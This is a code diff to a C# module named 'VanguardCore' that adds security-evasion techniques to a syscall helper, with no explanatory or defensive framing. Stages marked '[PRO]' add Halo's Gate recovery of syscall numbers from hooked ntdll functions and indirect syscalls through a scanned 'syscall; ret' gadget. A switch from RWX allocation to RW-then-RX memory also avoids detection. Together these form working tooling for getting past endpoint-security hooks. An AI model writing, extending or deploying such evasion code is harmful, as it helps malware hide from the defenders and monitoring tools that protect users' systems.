@@ -33,6 +33,7 @@ namespace VanguardCore
         }
 
         private static Dictionary<uint, SYSCALL_ENTRY> _syscallCache = new Dictionary<uint, SYSCALL_ENTRY>();
+        private static IntPtr _syscallGadget = IntPtr.Zero;
         private static bool _initialized = false;
 
         public static uint DJB2(string s)
@@ -62,9 +63,31 @@ namespace VanguardCore
                     SYSCALL_ENTRY entry = FindSyscall(ntdll, name);
                     if (entry.pAddress != IntPtr.Zero) _syscallCache[hash] = entry;
                 }
+
+                // Find Indirect Syscall Gadget (syscall; ret)
+                _syscallGadget = FindGadget(ntdll);
+                
                 _initialized = true;
             }
             catch { }
+        }
+
+        private static IntPtr FindGadget(IntPtr hModule)
+        {
+            // Scan ntdll for '0x0F 0x05 0xC3' (syscall; ret)
+            byte[] pattern = { 0x0F, 0x05, 0xC3 };
+            IntPtr pNtdll = hModule;
+            
+            // Just scan a reasonable range in ntdll
+            for (int i = 0; i < 0x100000; i++)
+            {
+                byte[] b = new byte[3];
+                IntPtr addr = (IntPtr)((long)pNtdll + 0x1000 + i);
+                Marshal.Copy(addr, b, 0, 3);
+                if (b[0] == pattern[0] && b[1] == pattern[1] && b[2] == pattern[2])
+                    return addr;
+            }
+            return IntPtr.Zero;
         }
 
         private static SYSCALL_ENTRY FindSyscall(IntPtr hModule, string functionName)
@@ -75,20 +98,46 @@ namespace VanguardCore
                 IntPtr pFunc = GetProcAddress(hModule, functionName);
                 if (pFunc == IntPtr.Zero) return entry;
 
+                entry.pAddress = pFunc;
                 byte[] buffer = new byte[32];
                 Marshal.Copy(pFunc, buffer, 0, 32);
-                for (int i = 0; i < 20; i++)
+
+                if (buffer[0] == 0x4C && buffer[1] == 0x8B && buffer[2] == 0xD1 && buffer[3] == 0xB8)
                 {
-                    if (buffer[i] == 0xB8) // mov eax, imm32
+                    entry.SSN = BitConverter.ToUInt32(buffer, 4);
+                }
+                else if (buffer[0] == 0xE9) // [PRO] Halo's Gate - Function is HOOKED
+                {
+                    // Scan neighbor functions (±32 bytes per stub)
+                    for (int idx = 1; idx <= 10; idx++)
                     {
-                        entry.SSN = BitConverter.ToUInt32(buffer, i + 1);
-                        entry.pAddress = pFunc;
-                        break;
+                        // Check neighbors UP
+                        if (CheckNeighbor(pFunc, idx, out uint ssnUp)) { entry.SSN = ssnUp + (uint)idx; break; }
+                        // Check neighbors DOWN
+                        if (CheckNeighbor(pFunc, -idx, out uint ssnDown)) { entry.SSN = ssnDown - (uint)idx; break; }
                     }
                 }
             }
             catch { }
             return entry;
+        }
+
+        private static bool CheckNeighbor(IntPtr pFunc, int distance, out uint ssn)
+        {
+            ssn = 0;
+            try
+            {
+                IntPtr pNeighbor = (IntPtr)((long)pFunc + (distance * 32));
+                byte[] b = new byte[32];
+                Marshal.Copy(pNeighbor, b, 0, 32);
+                if (b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8)
+                {
+                    ssn = BitConverter.ToUInt32(b, 4);
+                    return true;
+                }
+            }
+            catch { }
+            return false;
         }
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
@@ -121,16 +170,18 @@ namespace VanguardCore
                 SYSCALL_ENTRY entry = _syscallCache[hash];
                 byte[] code;
 
-                if (IntPtr.Size == 8) // x64
+                if (IntPtr.Size == 8) // x64 [PRO] Indirect Syscall
                 {
                     code = new byte[] {
-                        0x4C, 0x8B, 0xD1,               // mov r10, rcx
-                        0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <SSN>
-                        0x0F, 0x05,                     // syscall
-                        0xC3                            // ret
+                        0x4C, 0x8B, 0xD1,                               // mov r10, rcx
+                        0xB8, 0x00, 0x00, 0x00, 0x00,                   // mov eax, <SSN>
+                        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, <gadget>
+                        0xFF, 0xE1                                      // jmp rcx
                     };
+                    Buffer.BlockCopy(BitConverter.GetBytes(entry.SSN), 0, code, 4, 4);
+                    Buffer.BlockCopy(BitConverter.GetBytes((long)_syscallGadget), 0, code, 10, 8);
                 }
-                else // x86
+                else // x86 fallback
                 {
                     code = new byte[] {
                         0xB8, 0x00, 0x00, 0x00, 0x00,   // mov eax, <SSN>
@@ -138,12 +189,15 @@ namespace VanguardCore
                         0x0F, 0x34,                     // sysenter
                         0xC3                            // ret
                     };
+                    Buffer.BlockCopy(BitConverter.GetBytes(entry.SSN), 0, code, 1, 4);
                 }
 
-                Buffer.BlockCopy(BitConverter.GetBytes(entry.SSN), 0, code, (IntPtr.Size == 8 ? 4 : 1), 4);
-                
-                IntPtr pStub = Native.VirtualAlloc(IntPtr.Zero, (UIntPtr)code.Length, 0x1000 | 0x2000, 0x40);
+                // [PRO] RX Allocation (RW -> RX)
+                IntPtr pStub = Native.VirtualAlloc(IntPtr.Zero, (UIntPtr)code.Length, 0x1000 | 0x2000, 0x04); // PAGE_READWRITE
                 Marshal.Copy(code, 0, pStub, code.Length);
+                uint old;
+                Native.VirtualProtect(pStub, (UIntPtr)code.Length, 0x20, out old); // PAGE_EXECUTE_READ
+                
                 _stubCache[hash] = pStub;
             }
 
@@ -167,6 +221,9 @@ namespace VanguardCore
 
             [DllImport("kernel32.dll", SetLastError = true)]
             public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
+
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
         }
 
         public static IntPtr StealthGetModuleBase(string moduleName)
